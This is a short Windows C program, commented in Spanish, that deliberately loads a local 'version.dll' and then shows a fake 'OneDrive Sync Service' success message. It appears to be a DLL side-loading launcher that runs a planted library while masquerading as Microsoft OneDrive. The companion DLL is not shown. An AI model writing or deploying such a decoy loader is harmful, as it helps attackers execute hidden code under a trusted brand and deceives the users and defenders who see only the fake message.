#include <windows.h>

// Declaramos los tipos de las funciones
typedef DWORD (__stdcall *pGetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef BOOL (__stdcall *pGetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL (__stdcall *pVerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    // FORZAR carga de version.dll desde la carpeta local
    HMODULE hMod = LoadLibraryA("version.dll");
    
    if (hMod) {
        // Llamar a una función para asegurar que la DLL se "use"
        pGetFileVersionInfoSizeA pSize = (pGetFileVersionInfoSizeA)GetProcAddress(hMod, "GetFileVersionInfoSizeA");
        if (pSize) {
            DWORD dummy = 0;
            pSize("C:\\Windows\\System32\\notepad.exe", &dummy);
        }
    }
    
    MessageBoxA(NULL, "OneDrive Sync Service inicializado correctamente.", "OneDrive", MB_OK | MB_ICONINFORMATION);
    return 0;
}
